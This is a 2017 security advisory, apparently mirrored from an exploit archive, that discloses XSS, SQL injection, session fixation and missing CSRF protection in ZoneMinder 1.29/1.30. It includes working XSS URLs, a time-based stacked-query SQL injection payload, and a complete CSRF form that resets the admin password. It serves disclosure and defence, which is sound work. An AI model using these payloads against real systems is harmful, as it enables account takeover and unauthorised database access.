@@ -1,0 +1,110 @@
+id: 26883
+date: 02/02/2017
+title: Zoneminder 1.29 / 1.30 Multiple Vulnerabilities
+author: Tim Herres
+cves: 
+
+Zoneminder multiple vulnerabilities
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Affected Versions
+=================
+Zoneminder 1.29,1.30
+
+Issue Overview
+==============
+Vulnerability Type: SQL Injection, Cross Site Scripting, Session Fixation, No CSRF Protection
+Technical Risk: high
+Likelihood of Exploitation: medium
+Vendor: Zoneminder
+Vendor URL: https://zoneminder.com/
+Credits: FOXMOLE employee Tim Herres
+Advisory URL: https://www.foxmole.com/advisories/foxmole-2016-07-05.txt
+Advisory Status: Public
+CVE-Number: NA
+CVE URL: NA
+OVE-ID:
+OVI-ID:
+CWE-ID: CWE-89
+CVSS 2.0: 4.3 (AV:N/AC:M/Au:N/C:P/I:N/A:N)
+
+
+Impact
+======
+During an internal code review multiple vulnerabilities were identified.
+The whole application misses input validation and output encoding.
+This means user supplied input is inserted in an unsafe way.
+This could allow a remote attacker to easily compromise user accounts or access the database in an unsafe way.
+
+Issue Description
+=================
+The following findings are only examples there are quite more. The whole application should be reviewed.
+
+All items tested using Firefox
+
+1)Cross Site Scripting (XSS)
+Reflected:
+http://192.168.241.131/zm/index.php?view=request&request=log&task=download&key=a9fef1f4&format=texty9fke%27%3Chtml%3E%3Chead%3E%3C/head%3E%3Cbody%3E%3Cscript%3Ealert(1)%3C%2fscript%3E%3C/body%3E%3C/html%3Eayn2h
+Reflected without authentication: http://192.168.241.131/zm/index.php/LSE4%22%3E%3Cscript%3Ealert(1)%3C/script%3ELSE
+Stored: Creating a new monitor using the name "Bla<script>alert(1)</script>". There is only a clientside protection.
+
+2)SQL Injection
+Example Url:http://192.168.241.131/zm/index.php
+Parameter: limit (POST)
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)
+    Payload: view=request&request=log&task=query&limit=100;(SELECT *
+FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434
+Easy exploitable using sqlmap.
+
+3)Session Fixation
+After a successful authentication the Session Cookie ZMSESSID remains the same.
+Example: Cookie before the login = ZMSESSID=26ga0i62e4e51mhfcb68nk3dg2 after successful login
+ZMSESSID=26ga0i62e4e51mhfcb68nk3dg2
+
+4)No CSRF Proctection
+A possible CSRF attack form, which changes the password of the admin (uid=1), if the corresponding user activates it.
+<html>
+  <body>
+    <form action="http://192.168.241.131/zm/index.php" method="POST">
+      <input type="hidden" name="view" value="user" />
+      <input type="hidden" name="action" value="user" />
+      <input type="hidden" name="uid" value="1" />
+      <input type="hidden" name="newUser[MonitorIds]" value="" />
+      <input type="hidden" name="newUser[Username]" value="admin" />
+      <input type="hidden" name="newUser[Password]"
+value="admin1" />
+      <input type="hidden" name="conf_password" value="admin1" />
+      <input type="hidden" name="newUser[Language]" value="" />
+      <input type="hidden" name="newUser[Enabled]" value="1" />
+      <input type="hidden" name="newUser[Stream]" value="View" />
+      <input type="hidden" name="newUser[Events]" value="Edit" />
+      <input type="hidden" name="newUser[Control]" value="Edit" />
+      <input type="hidden" name="newUser[Monitors]" value="Edit" />
+      <input type="hidden" name="newUser[Groups]" value="Edit" />
+      <input type="hidden" name="newUser[System]" value="Edit" />
+      <input type="hidden" name="newUser[MaxBandwidth]" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+
+Temporary Workaround and Fix
+============================
+FOXMOLE advises to disable Zoneminder until the vendor publishes a complete fix.
+
+
+
+History
+=======
+2016-07-05  Issue discovered
+2016-11-22  Vendor contacted, no response
+2016-12-16  Vendor contacted again, still no response
+2017-01-17  Vendor contacted --> working on a patch
+2017-01-22  Vendor contacted, asked for an update and
+            declare advisory release to 2017-02-02 --> no response
+2017-02-02  Advisory Release
+
+#  0day.today [2023-03-24]  #
